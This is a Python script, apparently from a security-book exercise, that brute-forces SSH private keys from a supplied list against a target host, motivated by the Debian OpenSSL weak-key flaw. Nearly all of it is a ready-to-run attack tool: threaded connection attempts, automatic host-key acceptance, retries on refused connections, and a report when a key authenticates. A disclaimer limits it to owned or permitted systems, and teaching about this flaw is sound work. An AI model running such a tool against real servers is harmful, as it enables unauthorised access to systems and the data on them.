"""
This script demonstrates SSH keyfile brute-forcing, inspired by vulnerabilities like the Debian OpenSSL bug.

This mistake lasted for 2 years before it was discovered by a security researcher.
As a result, it is accurate to state that quite a few servers were built with a
weakened SSH service. It would be nice if we could build a tool to exploit this
vulnerability. However, with access to the key space, it is possible to write a
small Python script to brute force through each of the 32,767 keys in order to
authenticate to a passwordless SSH server that relies upon a public-key crypto-
graph. In fact, the Warcat Team wrote such a script and posted it to milw0rm
within days of the vulnerability discovery. Exploit-DB archived the Warcat Team
script at: http://www.exploit-db.com/exploits/5720/. However, lets write our
own script utilizing the same pexpect library we used to brute force through
password authentication.

This script is for educational purposes only. Do not use it on systems you do not own or have explicit permission to test.
"""

import optparse
import time
from threading import BoundedSemaphore, Thread

import paramiko

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(host, user, keyfile, release):
    global Stop
    global Fails
    try:
        # try to connect
        client = paramiko.SSHClient()
        # adding a policy to accept the host key and prevent being blocked
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, key_filename=keyfile, timeout=5)
        print("[+]Keyfile found: " + keyfile)
        Stop = True
        client.close()
    except paramiko.AuthenticationException:
        # handle failed authentication silently
        pass
    except paramiko.SSHException as e:
        # if connection refused or no route to host then wait 1 second and retry to connect
        if (
            "connection refused" in str(e).lower()
            or "no route to host" in str(e).lower()
        ):
            time.sleep(1)
            connect(host, user, keyfile, False)
        else:
            # else increment the Fails counter variables and wait 5 seconde and then retry
            Fails += 1
            time.sleep(5)
            connect(host, user, keyfile, False)
    except Exception as e:
        print(e)
        pass
    finally:
        if release:
            connection_lock.release()


def main():
    # just parsing the command to use it
    parser = optparse.OptionParser(
        "usage %prog " + "-H <target host> -u <user> -f <keyfile list>"
    )
    parser.add_option("-H", dest="tgtHost", type="string", help="specify target host")
    parser.add_option("-u", dest="tgtUser", type="string", help="specify user")
    parser.add_option(
        "-f", dest="keyfileList", type="string", help="specify keyfile list"
    )
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    tgtUser = options.tgtUser
    keyfileList = options.keyfileList
    if tgtHost == None or tgtUser == None or keyfileList == None:
        print(parser.usage)
        exit(0)
    with open(keyfileList, "r") as kf:
        for line in kf:
            if Stop:
                print("[*]Exiting: Keyfile found.")
                exit(0)
            if Fails > 5:
                print("[*]Exiting: Too many socket timeouts")
                exit(0)
            connection_lock.acquire()
            keyfile = line.strip()
            print("[-]Testing keyfile: " + str(keyfile))
            t = Thread(target=connect, args=(tgtHost, tgtUser, keyfile, True))
            t.start()


if __name__ == "__main__":
    main()
